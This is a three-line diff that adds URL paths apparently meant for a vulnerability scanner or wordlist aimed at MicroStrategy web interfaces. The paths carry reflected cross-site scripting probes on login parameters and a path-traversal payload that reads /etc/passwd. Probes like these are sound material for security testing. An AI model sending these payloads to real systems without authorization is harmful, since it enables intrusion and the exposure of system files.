@@ -1,0 +1,3 @@
+/microstrategy7/Login.asp?Server=Server001&Project=Project001&Port=0&Uid=Uid001&Msg=%22%3E%3Cscript%3Ealert(/{{randstr}}/)%3B%3C%2Fscript%3E%3C
+/WebMstr7/servlet/mstrWeb?evt=3045&src=mstrWeb.3045&subpage=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/MicroStrategyLibrary/auth/ui/loginPage?loginMode=alert(document.domain)
